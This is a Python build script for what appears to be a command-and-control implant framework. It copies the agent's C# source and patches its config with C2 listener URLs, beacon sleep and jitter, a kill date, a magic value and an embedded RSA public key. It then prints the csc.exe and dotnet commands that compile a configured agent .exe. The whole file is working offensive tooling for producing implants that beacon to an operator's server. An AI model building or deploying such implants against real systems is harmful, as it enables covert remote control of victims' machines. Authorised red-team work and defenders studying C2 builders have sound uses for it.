#!/usr/bin/env python3
"""
Build script for generating a configured agent .exe.

Modifies the agent source constants (Config.cs) with embedded C2 profile settings,
then compiles with csc.exe or MSBuild.

Usage:
  python build_agent.py \
    --profile profiles/default.yaml \
    --listener-url https://cdn.example.com/api/v1 \
    --rsa-pubkey keys/server_pub.pem \
    --sleep 60 --jitter 25 \
    --kill-date 2025-12-31 \
    --arch x64 \
    --output builds/agent.exe
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from client.profiles.parser import load_profile


def parse_args():
    p = argparse.ArgumentParser(description="Build configured agent")
    p.add_argument("--profile", type=Path, default=Path("profiles/default.yaml"))
    p.add_argument("--listener-url", default="https://127.0.0.1:443/api/v1")
    p.add_argument("--rsa-pubkey", type=Path, default=None)
    p.add_argument("--sleep", type=int, default=60)
    p.add_argument("--jitter", type=int, default=25)
    p.add_argument("--kill-date", default="")
    p.add_argument("--magic", default="0xDEADF00D")
    p.add_argument("--arch", choices=["x64", "x86"], default="x64")
    p.add_argument("--output", type=Path, default=Path("builds/agent.exe"))
    return p.parse_args()


def main():
    args = parse_args()
    project_root = Path(__file__).parent.parent
    agent_src = project_root / "agent" / "Agent"

    # Load profile
    if args.profile.exists():
        profile = load_profile(args.profile)
        print(f"[*] Loaded profile: {profile.name}")

    # Create build directory
    build_dir = project_root / "builds" / "tmp"
    if build_dir.exists():
        shutil.rmtree(build_dir)
    shutil.copytree(agent_src, build_dir)

    # Modify Config.cs with build-time values
    config_path = build_dir / "Core" / "Config.cs"
    config_content = config_path.read_text()

    # Replace C2 endpoints
    urls = ', '.join(f'"{u}"' for u in args.listener_url.split(','))
    config_content = re.sub(
        r'public static readonly string\[\] C2_ENDPOINTS = \{[^}]+\};',
        f'public static readonly string[] C2_ENDPOINTS = {{ {urls} }};',
        config_content,
    )

    # Replace sleep
    config_content = re.sub(
        r'public static readonly int DEFAULT_SLEEP_MS = \d+;',
        f'public static readonly int DEFAULT_SLEEP_MS = {args.sleep * 1000};',
        config_content,
    )

    # Replace jitter
    config_content = re.sub(
        r'public static readonly int DEFAULT_JITTER_PCT = \d+;',
        f'public static readonly int DEFAULT_JITTER_PCT = {args.jitter};',
        config_content,
    )

    # Replace kill date
    if args.kill_date:
        try:
            dt = datetime.strptime(args.kill_date, "%Y-%m-%d")
            unix_ts = int(dt.timestamp())
            config_content = re.sub(
                r'public static readonly long KILL_DATE_UNIX = \d+;',
                f'public static readonly long KILL_DATE_UNIX = {unix_ts};',
                config_content,
            )
        except ValueError:
            print(f"[!] Invalid kill date format: {args.kill_date}")

    # Replace magic
    magic_int = int(args.magic, 16) if args.magic.startswith("0x") else int(args.magic)
    config_content = re.sub(
        r'public static readonly uint MAGIC = 0x[0-9A-Fa-f]+;',
        f'public static readonly uint MAGIC = 0x{magic_int:08X};',
        config_content,
    )

    config_path.write_text(config_content)
    print("[*] Config.cs patched with build-time values")

    # RSA public key embedding
    if args.rsa_pubkey and args.rsa_pubkey.exists():
        from client.crypto.rsa import load_public_key, public_key_to_der
        pub_key = load_public_key(args.rsa_pubkey)
        der_bytes = public_key_to_der(pub_key)
        byte_array = ", ".join(f"0x{b:02X}" for b in der_bytes)
        config_content = config_path.read_text()
        config_content = re.sub(
            r'public static readonly byte\[\] RSA_PUBLIC_KEY = new byte\[\d*\] \{[^}]*\};',
            f'public static readonly byte[] RSA_PUBLIC_KEY = new byte[] {{ {byte_array} }};',
            config_content,
        )
        # Also handle empty array form
        config_content = re.sub(
            r'public static readonly byte\[\] RSA_PUBLIC_KEY = new byte\[0\];',
            f'public static readonly byte[] RSA_PUBLIC_KEY = new byte[] {{ {byte_array} }};',
            config_content,
        )
        config_path.write_text(config_content)
        print(f"[*] RSA public key embedded ({len(der_bytes)} bytes)")

    # Output path
    args.output.parent.mkdir(parents=True, exist_ok=True)

    print(f"[*] Agent source prepared in {build_dir}")
    print(f"[*] To compile, run:")
    print(f"    csc.exe /target:exe /platform:{args.arch} /optimize+ \\")
    print(f"      /out:{args.output} \\")
    print(f"      /reference:System.dll,System.Security.dll \\")
    print(f"      {build_dir}\\**\\*.cs")
    print()
    print(f"    Or: dotnet build {build_dir / 'Agent.csproj'} -o {args.output.parent}")


if __name__ == "__main__":
    main()
